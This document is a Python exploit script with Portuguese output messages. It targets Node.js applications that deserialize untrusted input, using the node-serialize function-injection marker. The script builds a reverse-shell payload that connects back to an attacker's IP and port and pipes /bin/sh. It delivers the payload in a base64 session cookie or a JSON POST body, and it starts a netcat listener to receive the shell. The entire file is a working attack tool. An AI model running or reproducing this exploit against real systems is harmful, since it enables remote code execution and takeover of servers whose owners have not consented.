#!/usr/bin/env python3
import os
import base64
import json
import sys
import subprocess
import requests
import time
from time import sleep

def clean():
    try:
        os.system("clear")
    except:
        os.system("cls")

def gerar_payload(ip, porta):
    shell_payload = f"""
function(){{
    var net = require('net'), 
        cp = require('child_process'), 
        sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect({porta}, '{ip}', function() {{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}}()
""".strip()

    payload_obj = {
        "email": "_$$ND_FUNC$$_" + shell_payload.replace('\n', '').replace('  ', '')
    }

    payload_json = json.dumps(payload_obj)
    payload_base64 = base64.b64encode(payload_json.encode()).decode()

    return payload_json, payload_base64

def iniciar_listener_em_background(porta):
    print(f"[+] Iniciando listener na porta {porta}...\n")
    try:
        listener = subprocess.Popen(["nc", "-lvnp", str(porta)])
        time.sleep(2)  # Pequeno delay para garantir que o listener esteja pronto
        return listener
    except Exception as e:
        print(f"[!] Erro ao iniciar listener: {e}")
        sys.exit(1)

def enviar_payload(url, payload_json, payload_base64, metodo):
    headers = {'Content-Type': 'application/json'}
    try:
        if metodo == "cookie":
            cookies = {"session": payload_base64}
            print(f"[+] Enviando payload para {url}...\n")
            response = requests.get(url, cookies=cookies)
        elif metodo == "json":
            print(f"[+] Enviando payload como JSON para {url}...\n")
            response = requests.post(url, data=payload_json, headers=headers)
        else:
            print("[!] Método inválido. Use --cookie ou --json.")
            return

        if response.status_code in [200,301,302]:
            print(f"[+] exploit completo!: {response.status_code}\n")
            sleep(0.4)
            os.system("clear")
    except Exception as e:
        print(f"[!] Falha ao enviar payload: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Uso:\n  {sys.argv[0]} <LHOST> <LPORT> [--reverse <URL> --cookie|--json]")
        sys.exit(1)

    clean()

    ip = sys.argv[1]
    porta = sys.argv[2]
    modo_reverse = '--reverse' in sys.argv
    payload_json, payload_base64 = gerar_payload(ip, porta)

    print("[+] Payload JSON:\n")
    print(payload_json)
    print("\n[+] Payload Base64 para (cookie, header, etc.):\n")
    print(payload_base64)

    if modo_reverse:
        try:
            url_index = sys.argv.index('--reverse') + 1
            url = sys.argv[url_index]

            if '--cookie' in sys.argv:
                metodo_envio = 'cookie'
            elif '--json' in sys.argv:
                metodo_envio = 'json'
            else:
                print("[!] Você deve especificar --cookie ou --json após --reverse.")
                sys.exit(1)

            listener = iniciar_listener_em_background(porta)
            enviar_payload(url, payload_json, payload_base64, metodo_envio)

            print("[*] Digite \033[1;32;4m'id'\033[m ou Pressione Ctrl+C para encerrar a shell\n")
            listener.wait()  # Mantém o listener em execução no terminal
        except Exception as e:
            print(f"[!] Erro ao processar argumentos: {e}")
            sys.exit(1)
